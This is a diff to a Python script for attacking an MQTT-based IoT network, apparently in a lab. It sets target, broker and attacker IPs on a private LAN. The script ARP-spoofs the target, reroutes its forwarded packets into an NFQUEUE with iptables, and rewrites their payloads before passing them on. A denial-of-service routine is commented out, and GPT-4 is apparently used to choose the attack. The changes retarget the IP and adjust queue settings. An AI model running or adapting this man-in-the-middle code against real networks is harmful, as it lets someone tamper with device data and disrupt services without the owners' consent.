@@ -14,7 +14,7 @@ from netfilterqueue import NetfilterQueue
 API_KEY = "Insert here"
 openai.api_key = API_KEY
 llm_model = "gpt-4"
-targetIP = "192.168.8.223"
+targetIP = "192.168.8.159"
 brokerIP = "192.168.8.210"
 attackerIP = "192.168.1.16"
 message = ""
@@ -172,6 +172,7 @@ Then modifies the payload and send it.
 def intercept_modify_forward(pkt):
     global sniffed_topic, sniffed_message
     global targetIP, desired_payload
+    print(f"Packet received: {pkt}")
     packet = IP(pkt.get_payload())
     if packet.haslayer(TCP):
         ip_src = packet[IP].src
@@ -259,13 +260,13 @@ def fake_data_transfer_attack():
         print("ARP spoofing mqtt")
         time.sleep(3)
         #Enables nfqueue
-        command = f"sudo iptables -A FORWARD -s {targetIP} -j NFQUEUE --queue-num 6"
+        command = f"sudo iptables -A FORWARD -s {targetIP} -j NFQUEUE --queue-num 1"
         os.system(command)
         
         nfqueue = NetfilterQueue()
-        nfqueue.bind(6, intercept_modify_forward)
+        nfqueue.bind(1, intercept_modify_forward)
         try:
-            nfqueue.run(block=False)
+            nfqueue.run()
         except Exception as e:
             print(f"An error occurred: {e}")
         print("Netfilter queue")
@@ -275,10 +276,10 @@ def fake_data_transfer_attack():
             #client.publish(sniffed_topic, "Hacked")
             pass
     except KeyboardInterrupt:
-        print("Stopping sniffing")
+        print("Stopping fake data")
         os.kill(nodeAttack.pid, signal.SIGTERM)
         #os.kill(routerAttack.pid, signal.SIGTERM)
-        command = f"sudo iptables -D FORWARD -s {targetIP} -j NFQUEUE --queue-num 6"
+        command = f"sudo iptables -D FORWARD -s {targetIP} -j NFQUEUE --queue-num 1"
         os.system(command)
         # Clean up when the user interrupts the script
         nfqueue.unbind()
@@ -292,8 +293,8 @@ try:
             #response = lang_classification()
             #json_string = '{"attack_class_fdt": true, "attack_class_dos": false, "attack_class_phsh": false}'
             #response = json.loads(json_string)
-        #fake_data_transfer_attack()
-        denial_of_service()
+        fake_data_transfer_attack()
+        #denial_of_service()
         break
 
 except KeyboardInterrupt:
